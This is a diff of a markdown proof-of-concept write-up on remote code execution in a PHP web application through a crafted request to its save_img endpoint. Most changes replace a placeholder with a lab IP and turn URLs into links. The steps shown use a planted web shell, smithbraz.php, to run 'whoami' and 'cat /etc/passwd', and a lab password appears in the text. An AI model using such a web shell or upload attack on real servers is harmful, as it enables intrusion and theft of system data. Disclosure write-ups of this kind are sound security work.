@@ -280,8 +280,8 @@ nano config/configure.php
 ```
 ```
 <?php
-define('HTTP_SERVER', 'http://IP_Address:8080');
-define('HTTPS_SERVER', 'http://IP_Address:8080');
+define('HTTP_SERVER', 'http://192.168.1.193:8080');
+define('HTTPS_SERVER', 'http://192.168.1.193:8080');
 
 include_once dirname(__DIR__) . '/configure.php';
 
@@ -307,7 +307,7 @@ Password: RedScan@2026!
 
 ### 1- Access you web browser and provide login in the web application
 
-http://192.168.1.193:8080
+[http://192.168.1.193:8080](http://192.168.1.193:8080)
 
 ![RCE](./img/01.png)
 
@@ -381,13 +381,13 @@ Result: The save_img endpoint returned HTTP 200 OK in response to the crafted PO
 
 
 ### 9- Validate 1: Access the created file in link and provide "whoami" command with "cmd" parameter:
-http://192.168.1.193:8080/export/smithbraz.php?cmd=whoami
+[http://192.168.1.193:8080/export/smithbraz.php?cmd=whoami](http://192.168.1.193:8080/export/smithbraz.php?cmd=whoami)
 
 ![RCE](./img/09.png)
 
 
 ### 10- Validate 2: Access the created file in link and provide "cat /etc/passwd" command with "cmd" parameter:
-http://192.168.1.193:8080/export/smithbraz.php?cmd=cat /etc/passwd
+[http://192.168.1.193:8080/export/smithbraz.php?cmd=cat /etc/passwd](http://192.168.1.193:8080/export/smithbraz.php?cmd=cat /etc/passwd)
 
 ![RCE](./img/10.png)
 
